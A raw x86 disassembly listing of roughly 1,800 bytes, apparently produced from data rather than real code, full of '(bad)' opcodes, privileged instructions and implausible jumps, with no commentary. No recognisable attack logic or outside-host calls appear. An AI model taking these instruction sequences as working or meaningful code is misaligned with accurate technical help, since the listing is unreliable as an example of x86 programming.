  40f709:	scas   eax,DWORD PTR es:[edi]
  40f70a:	xchg   edi,eax
  40f70b:	jo     0x40f718
  40f70d:	jmp    0x714c:0xe680d119
  40f714:	call   0x23641ca3
  40f719:	sub    eax,0xcd9aae2b
  40f71e:	xlat   BYTE PTR ds:[ebx]
  40f71f:	xor    bl,bl
  40f721:	js     0x40f6b4
  40f723:	push   es
  40f724:	inc    ecx
  40f725:	xchg   edx,eax
  40f726:	lock xor DWORD PTR [eax+ebx*2],ecx
  40f72a:	loopne 0x40f726
  40f72c:	and    eax,0xdfd7fd22
  40f731:	dec    edx
  40f732:	gs hlt 
  40f734:	fisubr DWORD PTR [esi]
  40f736:	in     eax,dx
  40f737:	scas   eax,DWORD PTR es:[edi]
  40f738:	adc    al,0xe7
  40f73a:	nop
  40f73b:	push   0xffffff89
  40f73d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f73e:	or     dh,bl
  40f740:	jae    0x40f732
  40f742:	and    ebx,DWORD PTR [eax]
  40f744:	xor    BYTE PTR [eax-0x5dcaac16],cl
  40f74a:	aas    
  40f74b:	add    DWORD PTR [ebx+eiz*2-0x40],0x36480b99
  40f753:	add    ecx,esi
  40f755:	ds test al,0x71
  40f758:	jne    0x40f7a6
  40f75a:	xor    al,0x41
  40f75c:	mov    ebx,0x5531d19e
  40f761:	add    BYTE PTR [edi+0x37],al
  40f764:	ret    
  40f765:	js     0x40f6fc
  40f767:	xor    bl,BYTE PTR [esi-0x5210cd4e]
  40f76d:	fcmove st,st(0)
  40f76f:	cmp    ch,cl
  40f771:	bound  esp,QWORD PTR [edx+eiz*1]
  40f774:	(bad)  
  40f776:	xlat   BYTE PTR ds:[ebx]
  40f777:	push   ebp
  40f778:	cmp    al,0x46
  40f77a:	mov    esp,0x1da50a3b
  40f77f:	sti    
  40f780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f781:	and    edx,DWORD PTR [ebx+0x74]
  40f784:	clc    
  40f785:	cs fcmovnu st,st(7)
  40f788:	adc    dl,BYTE PTR [edi-0x7d59e3d0]
  40f78e:	mov    ebp,0x7a9d469b
  40f793:	jge    0x40f80c
  40f795:	jo     0x40f78b
  40f797:	or     DWORD PTR [ecx-0x7dd475fa],edi
  40f79d:	push   ecx
  40f79e:	mov    al,0x7
  40f7a0:	dec    edi
  40f7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7a2:	mov    edx,0xb31c4d5e
  40f7a7:	rol    DWORD PTR [ebp+0x42],cl
  40f7aa:	fidivr DWORD PTR [edi+ebx*2+0x7]
  40f7ae:	cmp    cl,BYTE PTR [eax-0x19]
  40f7b1:	pop    edx
  40f7b2:	lahf   
  40f7b3:	ins    BYTE PTR es:[edi],dx
  40f7b4:	push   esi
  40f7b5:	mov    dl,0xac
  40f7b7:	les    edi,FWORD PTR [esp+ebx*2]
  40f7ba:	shl    DWORD PTR [esi+ecx*2-0x16c8a2c9],cl
  40f7c1:	xor    esi,DWORD PTR [ebp-0x301099f0]
  40f7c7:	test   eax,0xc15d9f4f
  40f7cc:	cmp    BYTE PTR [esi-0x2f5050af],dh
  40f7d2:	mov    ebx,0x7efd6e2a
  40f7d7:	ja     0x40f7bf
  40f7d9:	sbb    edx,DWORD PTR [edx]
  40f7db:	inc    esi
  40f7dc:	stos   DWORD PTR es:[edi],eax
  40f7dd:	jge    0x40f800
  40f7df:	test   ch,cl
  40f7e1:	stos   DWORD PTR es:[edi],eax
  40f7e2:	cli    
  40f7e3:	mov    ds:0xcc8a44ea,eax
  40f7e8:	mov    dh,0x9
  40f7ea:	mov    BYTE PTR [ebx],bh
  40f7ec:	push   cs
  40f7ed:	push   ecx
  40f7ee:	xchg   esi,eax
  40f7ef:	ins    BYTE PTR es:[edi],dx
  40f7f0:	imul   esp,DWORD PTR [eax+0x4b80fb65],0x625863
	...
  40f83e:	add    BYTE PTR [ecx],dl
  40f840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f841:	pop    esi
  40f842:	xor    eax,0xa57bfffe
  40f847:	int    0xa1
  40f849:	ficom  WORD PTR [ecx+ebx*1-0x71]
  40f84d:	stc    
  40f84e:	loop   0x40f859
  40f850:	inc    BYTE PTR [eax]
  40f852:	add    BYTE PTR [edx],ah
  40f854:	pop    es
  40f855:	add    BYTE PTR [eax],al
  40f857:	aas    
  40f858:	push   ds
  40f859:	test   BYTE PTR [eax+0x76785603],cl
  40f85f:	adc    eax,0x90d8ee17
  40f864:	out    0x56,al
  40f866:	cmp    ah,BYTE PTR [esi-0x12016b4]
  40f86c:	outs   dx,BYTE PTR ds:[esi]
  40f86d:	jae    0x40f8b6
  40f86f:	scas   al,BYTE PTR es:[edi]
  40f870:	arpl   WORD PTR [edi-0x72d03a88],bp
  40f876:	and    bl,al
  40f878:	pop    es
  40f879:	js     0x40f89d
  40f87b:	add    DWORD PTR [ebp-0x77243849],esi
  40f881:	mov    ch,0x65
  40f883:	and    DWORD PTR [ebx],eax
  40f885:	test   ebp,esi
  40f887:	inc    ebp
  40f888:	mov    edi,0x1f2a5af0
  40f88d:	inc    ecx
  40f88e:	(bad)  
  40f88f:	pushf  
  40f890:	cmp    eax,0xc7c780b0
  40f895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f896:	ret    
  40f897:	push   ss
  40f898:	outs   dx,BYTE PTR ds:[esi]
  40f899:	add    DWORD PTR [edx],edx
  40f89b:	cli    
  40f89c:	jb     0x40f860
  40f89e:	jmp    0x40f877
  40f8a0:	dec    esp
  40f8a1:	or     al,0x7c
  40f8a3:	bound  ecx,QWORD PTR [ebx-0x1c]
  40f8a6:	(bad)  
  40f8a8:	jmp    0xa14e:0xe5e5b55a
  40f8af:	sub    esp,eax
  40f8b1:	xor    bh,BYTE PTR [ebx+ebp*8-0x72f49b8d]
  40f8b8:	or     DWORD PTR [eax],ebx
  40f8ba:	popa   
  40f8bb:	loope  0x40f912
  40f8bd:	rcr    ebp,0x3
  40f8c0:	ss pop ecx
  40f8c2:	test   al,0xcc
  40f8c4:	xor    dl,BYTE PTR [esi+edx*8-0xd]
  40f8c8:	xor    DWORD PTR [edx+0x46918ea3],ebx
  40f8ce:	(bad)  
  40f8cf:	fnstcw WORD PTR ds:0x6f2b5dec
  40f8d5:	sub    esi,0xd
  40f8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d9:	jge    0x40f8f8
  40f8db:	push   esp
  40f8dc:	aam    0xcd
  40f8de:	mov    bl,cl
  40f8e0:	jecxz  0x40f953
  40f8e2:	stos   DWORD PTR es:[edi],eax
  40f8e3:	mov    cl,0xd5
  40f8e5:	cmp    al,0xe
  40f8e7:	push   eax
  40f8e8:	pop    ds
  40f8e9:	add    al,0x80
  40f8eb:	(bad)  
  40f8ec:	retf   
  40f8ed:	push   ebx
  40f8ee:	push   ss
  40f8ef:	das    
  40f8f0:	jbe    0x40f931
  40f8f2:	(bad)  
  40f8f3:	rol    DWORD PTR [eax-0x527e1ea7],1
  40f8f9:	xor    DWORD PTR [eax+0xd],edi
  40f8fc:	fsubr  DWORD PTR [edi+eiz*4-0x60]
  40f900:	bound  ebp,QWORD PTR [ebx+edi*1+0x7e74ddee]
  40f907:	popa   
  40f908:	(bad)  
  40f90a:	cli    
  40f90b:	push   esp
  40f90c:	mov    al,ds:0x96ca7832
  40f911:	mov    ch,0x40
  40f913:	sbb    al,0xcd
  40f915:	add    al,0x54
  40f917:	hlt    
  40f918:	mov    al,0x30
  40f91a:	adc    ebp,DWORD PTR [esp+ecx*1-0x5f99eb1e]
  40f921:	xor    DWORD PTR [ecx],esi
  40f923:	mov    dh,0xe7
  40f925:	repz xcrypt-cfb 
  40f929:	and    ecx,ebx
  40f92b:	sbb    al,0x93
  40f92d:	test   bl,0xf5
  40f930:	jmp    0x40f941
  40f932:	inc    esi
  40f933:	aas    
  40f934:	or     cl,BYTE PTR [edi-0x10bb2dfd]
  40f93a:	jl     0x40f8c7
  40f93c:	adc    BYTE PTR [eax-0x78a1a50c],al
  40f942:	fsub   DWORD PTR [edi-0x69]
  40f945:	lds    eax,FWORD PTR fs:[ebx]
  40f948:	fnstcw WORD PTR [ebp+0xe]
  40f94b:	jle    0x40f944
  40f94d:	pop    eax
  40f94e:	inc    ebp
  40f94f:	sub    BYTE PTR [eax-0x28993de],ah
  40f955:	cmp    ebp,DWORD PTR [ebx+0x4]
  40f958:	dec    esi
  40f959:	loope  0x40f9b4
  40f95b:	cmp    BYTE PTR [esi],cl
  40f95d:	mov    eax,ds:0xba80da30
  40f962:	xchg   esp,eax
  40f963:	xchg   edi,eax
  40f964:	rcl    DWORD PTR [edx-0x1],cl
  40f967:	sbb    BYTE PTR [edx+esi*1-0x5a],0x9a
  40f96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f96d:	dec    edx
  40f96e:	cli    
  40f96f:	(bad)  
  40f970:	and    DWORD PTR [ebp+0x4dc83d04],ebx
  40f976:	or     ebx,DWORD PTR [ecx+0x14]
  40f979:	pop    ebp
  40f97a:	fisttp WORD PTR [eax+0x57]
  40f97d:	mov    al,0x98
  40f97f:	push   edx
  40f980:	cmp    al,0xa5
  40f982:	(bad)  
  40f983:	out    0x52,eax
  40f985:	jl     0x40f9c9
  40f987:	push   0xffffffe4
  40f989:	sahf   
  40f98a:	lahf   
  40f98b:	jae    0xd0e65aab
  40f991:	scas   al,BYTE PTR es:[edi]
  40f992:	cld    
  40f993:	scas   eax,DWORD PTR es:[edi]
  40f994:	adc    eax,0x4427759
  40f999:	jb     0x40f95e
  40f99b:	pop    ss
  40f99c:	lods   al,BYTE PTR ds:[esi]
  40f99d:	xchg   ebp,eax
  40f99e:	sub    al,0x29
  40f9a0:	int3   
  40f9a1:	jae    0x40fa1f
  40f9a3:	pop    ecx
  40f9a4:	sbb    al,bh
  40f9a6:	into   
  40f9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9a8:	dec    esi
  40f9a9:	ss stos BYTE PTR es:[edi],al
  40f9ab:	icebp  
  40f9ac:	sub    edx,ebx
  40f9ae:	push   0x90eca741
  40f9b3:	jmp    DWORD PTR [ecx-0x17df59ac]
  40f9b9:	xchg   BYTE PTR [eax-0x1b616128],bh
  40f9bf:	jbe    0x40fa40
  40f9c1:	sub    al,0xfa
  40f9c3:	push   es
  40f9c4:	or     al,0xc8
  40f9c6:	aaa    
  40f9c7:	fisubr DWORD PTR [eax-0x42]
  40f9ca:	push   esp
  40f9cb:	xchg   ecx,eax
  40f9cc:	sub    eax,0xb25c893
  40f9d1:	xor    al,0x53
  40f9d3:	mov    al,0x24
  40f9d5:	jno    0x40f9c3
  40f9d7:	jns    0x40f961
  40f9d9:	mov    al,0xba
  40f9db:	sub    BYTE PTR [edx],0x52
  40f9de:	hlt    
  40f9df:	sub    ebx,eax
  40f9e1:	or     al,0x46
  40f9e3:	push   eax
  40f9e4:	imul   edx,DWORD PTR [eax],0x3a5c262c
  40f9ea:	mov    eax,0xfb737ed4
  40f9ef:	punpcklbw mm4,mm5
  40f9f2:	jb     0x40fa51
  40f9f4:	jae    0x40f9ad
  40f9f6:	sub    dh,BYTE PTR [ebp-0x40]
  40f9f9:	(bad)  
  40f9fa:	jmp    0x40fa72
  40f9fc:	push   eax
  40f9fd:	mov    bh,0x65
  40f9ff:	and    edi,DWORD PTR [ecx+0x5c69800b]
  40fa05:	ds inc edx
  40fa07:	leave  
  40fa08:	call   0xdf30e6f5
  40fa0d:	add    ecx,DWORD PTR [ecx+0x76]
  40fa10:	or     esp,eax
  40fa12:	iret   
  40fa13:	mov    al,0xd8
  40fa15:	(bad)  
  40fa16:	push   ecx
  40fa17:	sbb    DWORD PTR [edx-0x2f],esp
  40fa1a:	das    
  40fa1b:	(bad)  
  40fa1c:	fnsave [edi+0x243d2a73]
  40fa22:	(bad)  
  40fa23:	sub    dh,BYTE PTR [edi-0x3d]
  40fa26:	es push ebp
  40fa28:	xchg   ecx,eax
  40fa29:	adc    eax,0xfe4f1bc5
  40fa2e:	mov    al,0xa
  40fa30:	cld    
  40fa31:	ficom  DWORD PTR [edi+0x25]
  40fa34:	sub    ebp,DWORD PTR [esi]
  40fa36:	fsubr  st,st(5)
  40fa38:	dec    esp
  40fa39:	adc    ebx,DWORD PTR [eax]
  40fa3b:	push   es
  40fa3c:	xor    DWORD PTR [ecx+eiz*2],edx
  40fa3f:	std    
  40fa40:	jb     0x40fa5f
  40fa42:	mov    edi,0xdbb91b09
  40fa47:	popa   
  40fa48:	fld    DWORD PTR [ebx-0x6c70c65e]
  40fa4e:	hlt    
  40fa4f:	aad    0xcf
  40fa51:	xor    bl,BYTE PTR [eax-0x57]
  40fa54:	mov    ch,0x53
  40fa56:	mov    esp,0xa25b1f0c
  40fa5b:	jnp    0x40faa5
  40fa5d:	int    0x30
  40fa5f:	pushf  
  40fa60:	and    BYTE PTR [ecx],dl
  40fa62:	push   esp
  40fa63:	not    BYTE PTR es:[ecx-0x3eea7bdf]
  40fa6a:	aas    
  40fa6b:	mov    esi,esi
  40fa6d:	or     edi,DWORD PTR [edx+0x2c9e6b48]
  40fa73:	xchg   esp,eax
  40fa74:	not    DWORD PTR [ebp+0x5e0b8bfe]
  40fa7a:	sahf   
  40fa7b:	xor    eax,0xf3372935
  40fa80:	or     eax,ebx
  40fa82:	adc    DWORD PTR ds:0x46fb125c,edi
  40fa88:	push   ss
  40fa89:	jmp    0x40fa2d
  40fa8b:	scas   al,BYTE PTR es:[edi]
  40fa8c:	jno    0x40fa83
  40fa8e:	fwait
  40fa8f:	(bad)  
  40fa91:	adc    al,0xe7
  40fa93:	(bad)  
  40fa95:	sub    DWORD PTR [edi+ebp*1],ecx
  40fa98:	out    dx,eax
  40fa99:	sbb    eax,0x77451f8
  40fa9e:	pop    esi
  40fa9f:	xchg   DWORD PTR [ecx+0x40],edx
  40faa2:	xchg   ecx,eax
  40faa3:	or     dl,BYTE PTR [esi]
  40faa5:	sub    eax,0x741ac8f5
  40faaa:	push   ecx
  40faab:	push   eax
  40faac:	sub    ah,BYTE PTR [ebx]
  40faae:	(bad)  
  40faaf:	jbe    0x40fa9f
  40fab1:	fidiv  WORD PTR [edx+ebx*8]
  40fab4:	add    DWORD PTR [esi],ebx
  40fab6:	lds    edi,FWORD PTR [esp+ebx*4-0x72]
  40faba:	cmp    eax,0xf1929adf
  40fabf:	retf   
  40fac0:	jo     0x40faeb
  40fac2:	xchg   ebx,eax
  40fac3:	data16 (bad) 
  40fac6:	aam    0x14
  40fac8:	and    ecx,edi
  40faca:	sub    al,0xc4
  40facc:	push   cs
  40facd:	adc    eax,0xfbed1c99
  40fad2:	xor    eax,0x1eacfa8b
  40fad7:	retf   
  40fad8:	jp     0x40fb08
  40fada:	xor    al,0xfc
  40fadc:	jmp    0x1f22a5aa
  40fae1:	loope  0x40fa85
  40fae3:	fadd   DWORD PTR [esi+0x7d]
  40fae6:	vmwrite esi,DWORD PTR [ebx+0x5b]
  40faea:	dec    ebp
  40faeb:	aam    0xb0
  40faed:	mov    ebx,0x7646e3c4
  40faf2:	push   DWORD PTR [ebx-0x4ca443d2]
  40faf8:	and    eax,0xdef1084d
  40fafd:	out    0x46,eax
  40faff:	lods   eax,DWORD PTR ds:[esi]
  40fb00:	sbb    BYTE PTR [edi+edx*1],dh
  40fb03:	out    dx,al
  40fb04:	mov    dh,bh
  40fb06:	jmp    0x40fb03
  40fb08:	inc    ebx
  40fb09:	sub    eax,0xb0f6935d
  40fb0e:	pop    ebp
  40fb0f:	addr16 mov dl,0xd0
  40fb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb13:	cld    
  40fb14:	adc    bl,BYTE PTR [eax+edx*8+0x11b94be0]
  40fb1b:	xchg   DWORD PTR [ebp+0x6],esi
  40fb1e:	cmp    eax,0x79f9911c
  40fb23:	add    al,0x4b
  40fb25:	jp     0x40fb7f
  40fb27:	jns    0x40fb1f
  40fb29:	jbe    0x40fb40
  40fb2b:	jl     0x40fad9
  40fb2d:	outs   dx,BYTE PTR ds:[esi]
  40fb2e:	in     eax,dx
  40fb2f:	xor    esi,ebp
  40fb31:	pop    ss
  40fb32:	mov    al,ds:0xedcb0c92
  40fb37:	and    DWORD PTR [eax+ecx*1],edx
  40fb3a:	jbe    0x40facf
  40fb3c:	pop    esi
  40fb3d:	jno    0x40fb5d
  40fb3f:	sub    DWORD PTR [edi+0x42],edi
  40fb42:	push   cs
  40fb43:	fadd   DWORD PTR [ebx-0x3e]
  40fb46:	and    BYTE PTR [ebx+0x55],cl
  40fb49:	jle    0x40fb6c
  40fb4b:	add    ebp,DWORD PTR [edi]
  40fb4d:	jmp    0xd88c6306
  40fb52:	dec    ecx
  40fb53:	fcmovu st,st(2)
  40fb55:	inc    edx
  40fb56:	pop    eax
  40fb57:	ret    
  40fb58:	inc    ecx
  40fb59:	inc    ebp
  40fb5a:	pop    ebx
  40fb5b:	fsub   st(0),st
  40fb5d:	xor    ebp,esp
  40fb5f:	aaa    
  40fb60:	xchg   esp,eax
  40fb61:	jmp    0x314b9ba4
  40fb66:	sub    DWORD PTR [eax-0x242f8650],0xba8d5f1c
  40fb70:	and    ch,cl
  40fb72:	dec    esi
  40fb73:	push   edx
  40fb74:	xchg   edi,ecx
  40fb76:	pop    es
  40fb77:	jge    0x40fba9
  40fb79:	fwait
  40fb7a:	jo     0x40fb99
  40fb7c:	nop
  40fb7d:	inc    ecx
  40fb7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb7f:	je     0x40fb5c
  40fb81:	movlps QWORD PTR [ebp+0x3],xmm0
  40fb85:	call   0x4588e601
  40fb8a:	sahf   
  40fb8b:	pop    ss
  40fb8c:	push   0x39
  40fb8e:	mov    BYTE PTR [ebp+0x3a],bh
  40fb91:	pop    edx
  40fb92:	inc    ecx
  40fb93:	mov    bh,0xb3
  40fb95:	in     al,dx
  40fb96:	sbb    edx,ebp
  40fb98:	add    ebp,DWORD PTR [esi-0x57]
  40fb9b:	jle    0x40fbf4
  40fb9d:	jns    0x40fb57
  40fb9f:	inc    edx
  40fba0:	mov    dl,0x45
  40fba2:	push   ebx
  40fba3:	arpl   di,cx
  40fba5:	push   es
  40fba6:	jns    0x40fb66
  40fba8:	mov    ebp,0x494b374f
  40fbad:	xor    BYTE PTR [ebp-0x2ae00017],0xd5
  40fbb4:	lods   eax,DWORD PTR ds:[esi]
  40fbb5:	mov    dl,0x27
  40fbb7:	push   0xffffffa5
  40fbb9:	fcomp  QWORD PTR [edi]
  40fbbb:	pop    eax
  40fbbc:	sbb    BYTE PTR [ecx+0x4eb23d4e],ch
  40fbc2:	xor    DWORD PTR [esp+esi*4],ebp
  40fbc5:	shl    BYTE PTR [ecx+0x42],cl
  40fbc8:	clc    
  40fbc9:	fwait
  40fbca:	mov    al,ds:0x80dccacf
  40fbcf:	test   BYTE PTR [ebp+0x1a],dh
  40fbd2:	jne    0x40fc4b
  40fbd4:	mov    dl,0x6a
  40fbd6:	repz push ebp
  40fbd8:	icebp  
  40fbd9:	aas    
  40fbda:	pop    eax
  40fbdb:	out    dx,eax
  40fbdc:	push   edx
  40fbdd:	stos   DWORD PTR es:[edi],eax
  40fbde:	repnz mov al,0xae
  40fbe1:	pop    ds
  40fbe2:	ret    
  40fbe3:	leave  
  40fbe4:	mov    ebx,0xd554a619
  40fbe9:	shl    DWORD PTR ds:0xb9974a81,0x9b
  40fbf0:	in     eax,0xe3
  40fbf2:	or     eax,0x7ec9aef6
  40fbf7:	xor    al,0xd5
  40fbf9:	fs dec esi
  40fbfb:	call   0x2628de74
  40fc00:	add    DWORD PTR [ebx-0x7f0fad0c],ecx
  40fc06:	rol    ecx,0xa7
  40fc09:	dec    edi
  40fc0a:	mov    ds:0x503e582e,al
  40fc0f:	inc    ebp
  40fc10:	dec    eax
  40fc11:	ins    BYTE PTR es:[edi],dx
  40fc12:	dec    eax
  40fc13:	(bad)  
  40fc14:	fwait
  40fc15:	adc    DWORD PTR [edx],eax
  40fc17:	shr    BYTE PTR [ecx+0x432e26d2],1
  40fc1d:	and    BYTE PTR [ebp+0x77],cl
  40fc20:	in     al,0x34
  40fc22:	inc    ebp
  40fc23:	addr16 inc edi
  40fc25:	jp     0x40fc20
  40fc27:	in     eax,0xcc
  40fc29:	daa    
  40fc2a:	xchg   edi,eax
  40fc2b:	call   0x7d795b1a
  40fc30:	mul    esi
  40fc32:	sbb    BYTE PTR [ebp-0x3699a811],0x40
  40fc39:	jmp    0x40fc93
  40fc3b:	push   edi
  40fc3c:	sar    BYTE PTR [ebp-0x54],1
  40fc3f:	fwait
  40fc40:	sub    al,ah
  40fc42:	and    edx,edi
  40fc44:	adc    bl,BYTE PTR [esi]
  40fc46:	and    esp,ecx
  40fc48:	jbe    0x40fc8d
  40fc4a:	inc    ebp
  40fc4b:	inc    edi
  40fc4c:	call   0x977c:0xaa6707bf
  40fc53:	imul   BYTE PTR [edi+0x3d]
  40fc56:	(bad)  
  40fc57:	ja     0x40fcc5
  40fc59:	mov    ebp,0x2492a036
  40fc5e:	inc    edx
  40fc5f:	retf   0x8f4d
  40fc62:	sbb    ebx,edi
  40fc64:	mov    al,0xc8
  40fc66:	ret    0x42db
  40fc69:	cs push ebx
  40fc6b:	(bad)  
  40fc6c:	mov    edx,0x7fcf7ec7
  40fc71:	push   esi
  40fc72:	add    DWORD PTR [eax-0x74],esp
  40fc75:	xchg   esp,eax
  40fc76:	out    dx,al
  40fc77:	outs   dx,BYTE PTR ds:[esi]
  40fc78:	test   BYTE PTR [ebx-0xf],cl
  40fc7b:	adc    al,0xac
  40fc7d:	mov    eax,ds:0x7a817cd5
  40fc82:	mov    BYTE PTR [esi],ch
  40fc84:	add    al,0xf6
  40fc86:	jb     0x40fc75
  40fc88:	pop    eax
  40fc89:	imul   ecx,DWORD PTR [edx+eax*8+0x79],0xa2af640b
  40fc91:	inc    edi
  40fc92:	cli    
  40fc93:	mov    eax,ds:0xae1a2be
  40fc98:	xchg   esi,eax
  40fc99:	push   cs
  40fc9a:	shl    DWORD PTR [ecx],1
  40fc9c:	vpshab ymm8,[edx+0x5595b389],xmm0
  40fca5:	mov    edx,0xaa7d717
  40fcaa:	adc    eax,0xcc1fe6c2
  40fcaf:	push   ebp
  40fcb0:	test   BYTE PTR [edx-0xc],0xb3
  40fcb4:	pop    ebp
  40fcb5:	jle    0x40fd0b
  40fcb7:	mov    esi,0x177bcc87
  40fcbc:	cli    
  40fcbd:	cdq    
  40fcbe:	and    ebp,DWORD PTR [ecx+0x2639cec3]
  40fcc4:	loopne 0x40fc9d
  40fcc6:	shr    ah,cl
  40fcc8:	push   edx
  40fcc9:	daa    
  40fcca:	sbb    BYTE PTR [ecx-0x36],dh
  40fccd:	loope  0x40fd1e
  40fccf:	or     DWORD PTR [edi+0x24fd5180],esp
  40fcd5:	mov    DWORD PTR [esi],eax
  40fcd7:	sbb    BYTE PTR [ebx],bh
  40fcd9:	ret    0x3fdc
  40fcdc:	push   esp
  40fcdd:	mov    dh,0x65
  40fcdf:	xor    esp,0xffffff92
  40fce2:	outs   dx,DWORD PTR ds:[esi]
  40fce3:	push   eax
  40fce4:	retf   
  40fce5:	dec    edx
  40fce6:	or     al,ch
  40fce8:	(bad)  
  40fce9:	xchg   BYTE PTR [edi+0x61f2a55c],ah
  40fcef:	imul   ebp,DWORD PTR [eax-0x2af19e3c],0xffffffad
  40fcf6:	cmp    cl,BYTE PTR [eax]
  40fcf8:	loope  0x40fd0f
  40fcfa:	push   0xa7f26e64
  40fcff:	iret   
  40fd00:	cmp    eax,0x8760dbfb
  40fd05:	mov    eax,ds:0xadf33366
  40fd0a:	sti    
  40fd0b:	(bad)
  40fd0e:	jg     0x40fcb7
  40fd10:	arpl   WORD PTR [esi],dx
  40fd12:	sahf   
  40fd13:	lds    eax,FWORD PTR [esi+0x43ba174a]
  40fd19:	dec    edi
  40fd1a:	es in  eax,dx
  40fd1c:	pop    esp
  40fd1d:	mov    cl,0xb5
  40fd1f:	mov    ch,0x27
  40fd21:	mov    eax,ds:0x6dd76577
  40fd26:	xor    edx,DWORD PTR [eax]
  40fd28:	xor    ch,BYTE PTR [ebx+0x54]
  40fd2b:	sbb    DWORD PTR [ebx],ebx
  40fd2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd2e:	add    DWORD PTR [esi-0x54897f1b],0xfffffffc
  40fd35:	in     eax,dx
  40fd36:	inc    edi
  40fd37:	mov    es,WORD PTR [edi+0x439a4ba1]
  40fd3d:	fsubr  st,st(7)
  40fd3f:	scas   al,BYTE PTR es:[edi]
  40fd40:	outs   dx,BYTE PTR ds:[esi]
  40fd41:	in     eax,0x23
  40fd43:	test   al,0x68
  40fd45:	and    DWORD PTR [ebp+0x47fdb551],ebp
  40fd4b:	cmovno esi,DWORD PTR [ecx-0x7d]
  40fd4f:	mov    edx,0x7ccbe1f5
  40fd54:	test   al,0x72
  40fd56:	fist   DWORD PTR [ecx+0x35e516dd]
  40fd5c:	ins    DWORD PTR es:[edi],dx
  40fd5d:	adc    DWORD PTR [esi+0x20],esp
  40fd60:	jle    0x40fd44
  40fd62:	mov    dh,0x74
  40fd64:	jecxz  0x40fd39
  40fd66:	out    0x45,eax
  40fd68:	inc    edx
  40fd69:	jno    0x40fd44
  40fd6b:	icebp  
  40fd6c:	call   0xd07f9225
  40fd71:	mov    ebx,edi
  40fd73:	sbb    bl,bh
  40fd75:	into   
  40fd76:	and    dh,dl
  40fd78:	aad    0xe5
  40fd7a:	dec    esp
  40fd7b:	inc    ecx
  40fd7c:	call   0xe8b1d0be
  40fd81:	xchg   edi,eax
  40fd82:	dec    DWORD PTR [ecx-0x18ea0f3c]
  40fd88:	pop    edx
  40fd89:	sbb    edx,DWORD PTR [edx-0x35d41a6b]
  40fd8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd90:	add    BYTE PTR [ecx],dl
  40fd92:	inc    edi
  40fd93:	mov    al,0x79
  40fd95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd96:	out    0xec,eax
  40fd98:	sub    eax,0xce93e085
  40fd9d:	mov    ecx,0x85b1165c
  40fda2:	clc    
  40fda3:	sar    DWORD PTR [eax+0x20a6a207],1
  40fda9:	arpl   WORD PTR [eax-0x30913694],di
  40fdaf:	ds cdq 
  40fdb1:	jge    0x40fd72
  40fdb3:	sub    dh,BYTE PTR [edi-0xe613af9]
  40fdb9:	(bad)
  40fdbc:	inc    ebx
  40fdbd:	int    0x69
  40fdbf:	xchg   BYTE PTR [ecx+esi*1-0x6e29e177],dl
  40fdc6:	or     BYTE PTR [esi+eax*8],ch
  40fdc9:	hlt    
  40fdca:	test   al,0xfe
  40fdcc:	stc    
  40fdcd:	fs ss mov ebx,esp
  40fdd1:	or     dh,BYTE PTR [edx]
  40fdd3:	or     DWORD PTR [ecx-0x37ccb674],ebx
  40fdd9:	loop   0x40fd9e
  40fddb:	push   esp
  40fddc:	retf   
  40fddd:	fdivr  QWORD PTR [edx]
  40fddf:	outs   dx,BYTE PTR ds:[esi]
  40fde0:	das    
  40fde1:	xchg   BYTE PTR [ecx+0x3b],dl
  40fde4:	jl     0x40fdd1
  40fde6:	jbe    0x40fe4d
  40fde8:	xor    edx,DWORD PTR [ecx-0x35]
  40fdeb:	pop    ss
  40fdec:	inc    esp
  40fded:	push   eax
  40fdee:	mov    edx,0x830a9b24
  40fdf3:	fadd   DWORD PTR [eiz*4+0x4ab54f51]
  40fdfa:	mov    al,ds:0xa893cce5
  40fdff:	mov    esi,0xdc5ca2d9
  40fe04:	jae    0x40fe6e
  40fe06:	sub    eax,0x44239b96
  40fe0b:	xor    ebx,DWORD PTR [ebx]
  40fe0d:	clc    
  40fe0e:	sti    
  40fe0f:	stc    
  40fe10:	add    DWORD PTR [edx+0x526bbea9],esi
  40fe16:	es ja  0x40fdd0
  40fe19:	mov    ds:0x777f7c23,al
  40fe1e:	xchg   ebx,eax
  40fe1f:	lea    edx,[edi-0x374007a1]
  40fe25:	and    DWORD PTR [ecx+0x3b],esi
  40fe28:	imul   ebx,eax,0xffffffb7
  40fe2b:	and    DWORD PTR [edi+0x87acfcc],ecx
  40fe31:	nop
  40fe32:	shl    BYTE PTR [edx-0x40],cl
  40fe35:	fcmove st,st(1)
  40fe37:	std    
  40fe38:	pop    edx
  40fe39:	ror    BYTE PTR [ecx+0x12],1
  40fe3c:	xchg   ebp,eax
  40fe3d:	fisttp QWORD PTR [ebx]
  40fe3f:	cmp    DWORD PTR [ebx+0x6972cc16],0x594b1e0e
  40fe49:	arpl   WORD PTR [esi+0x2a],di
  40fe4c:	adc    eax,ebp
  40fe4e:	and    ah,BYTE PTR [edi-0x68291c23]
  40fe54:	inc    ebx
  40fe55:	pop    edx
  40fe56:	xchg   ecx,eax
  40fe57:	adc    al,0x31
  40fe59:	int    0x75
  40fe5b:	mov    eax,0x4b3d394b
  40fe60:	xor    DWORD PTR [edx],esp
  40fe62:	lods   al,BYTE PTR ds:[esi]
  40fe63:	lods   eax,DWORD PTR ds:[esi]
  40fe64:	or     bl,ah
  40fe66:	pop    ecx
  40fe67:	mov    ebp,0x1e1745d0
  40fe6c:	nop
  40fe6d:	out    0x20,eax
  40fe6f:	or     BYTE PTR [eax],0xf2
  40fe72:	xchg   esi,eax
  40fe73:	popa   
  40fe74:	push   0x53
  40fe76:	fldcw  WORD PTR [eax+0x75]
  40fe79:	sub    ebp,DWORD PTR [edx]
  40fe7b:	and    DWORD PTR [ecx],ebp
  40fe7d:	ins    BYTE PTR es:[edi],dx
  40fe7e:	imul   edx,DWORD PTR [ebp-0x64],0x6005954b
